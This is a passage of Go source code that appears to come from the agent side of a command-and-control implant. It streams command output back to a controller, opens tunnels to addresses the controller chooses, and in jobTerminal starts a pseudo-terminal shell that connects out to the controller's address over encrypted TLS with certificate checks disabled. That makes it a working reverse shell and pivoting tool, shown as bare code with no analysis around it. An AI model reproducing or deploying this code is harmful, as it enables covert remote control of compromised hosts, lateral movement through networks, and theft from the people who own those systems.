					ansRun.Stdout = chunk[:maxChunkSize]
					lastOutLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stdout = chunk
					lastOutLen = len(finalOut)
				}
			}

			if len(finalErrOut) > lastErrLen {
				chunk := finalErrOut[lastErrLen:]
				if len(chunk) > maxChunkSize {
					ansRun.Stderr = chunk[:maxChunkSize]
					lastErrLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stderr = chunk
					lastErrLen = len(finalErrOut)
				}
			}

			if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
				job.Data, _ = msgpack.Marshal(ansRun)
				packedJob, _ = msgpack.Marshal(job)
				message = utils.Message{
					Type:   2,
					Object: [][]byte{packedJob},
				}
				sendData, _ = msgpack.Marshal(message)
				sendData, _ = utils.EncryptData(sendData, utils.SKey)
				functions.SendMsg(conn, sendData)

				if hasMore {
					time.Sleep(100 * time.Millisecond)
				}
			}

			if !hasMore {
				break
			}
		}


		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobTunnel(paramsData []byte) {
	var params utils.ParamsTunnelStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		success := true
		reason := byte(0)
		clientConn, err := net.DialTimeout(params.Proto, params.Address, 20*time.Second)
		if err != nil {
			success = false
			var opErr *net.OpError
			if errors.As(err, &opErr) {
				if opErr.Timeout() {
					reason = 4
				}
				if errors.Is(opErr.Err, syscall.ECONNREFUSED) {
					reason = 5
				}
				if errors.Is(opErr.Err, syscall.ENETUNREACH) {
					reason = 3
				}
			}
		}

		ctx, cancel := context.WithCancel(context.Background())
		tc := &TunnelConn{
			Conn:        clientConn,
			Cancel:      cancel,
			channelId:   params.ChannelId,
			connSuccess: success,
			connReason:  reason,
		}
		TUNNELS.Store(params.ChannelId, tc)

		if !success {
			return
		}

		go func() {
			defer func() {
				tc.mu.Lock()
				tc.closed = true
				tc.mu.Unlock()
				tc.Cancel()
			}()

			buf := make([]byte, 0x8000)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if tc.Paused.Load() {
						time.Sleep(50 * time.Millisecond)
						continue
					}
					clientConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
					n, readErr := clientConn.Read(buf)
					if n > 0 {
						data := make([]byte, n)
						copy(data, buf[:n])
						tc.mu.Lock()
						tc.outQueue = append(tc.outQueue, data)
						tc.mu.Unlock()
					}
					if readErr != nil {
						if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
							continue
						}
						return
					}
				}
			}
		}()

		go func() {
			<-ctx.Done()
			if clientConn != nil {
				clientConn.Close()
			}
		}()
	}()
}

func jobTerminal(paramsData []byte) {
	var params utils.ParamsTerminalStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		status := ""

		process := exec.Command(params.Program)
		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
		if err != nil {
			active = false
			status = err.Error()
		}

		var srvConn net.Conn
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			if active {
				functions.StopPty(ptyProc)
				_ = process.Process.Kill()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TERMINAL_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				if active {
					functions.StopPty(ptyProc)
					_ = process.Process.Kill()
				}
				return
			}
		}

		_ = functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		encCipher, _ := aes.NewCipher(tunKey)
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, _ := aes.NewCipher(tunKey)
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TERMINALS.Store(params.TermId, cancel)
		defer TERMINALS.Delete(params.TermId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				time.Sleep(200 * time.Millisecond)
				_ = functions.StopPty(ptyProc)
				if functions.IsProcessRunning(process) {
					_ = process.Process.Kill()
				}
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			functions.RelayConnToPty(ptyProc, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			functions.RelayPtyToConn(streamWriter, ptyProc)
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()
		_ = process.Wait()
		cancel()
	}()
}
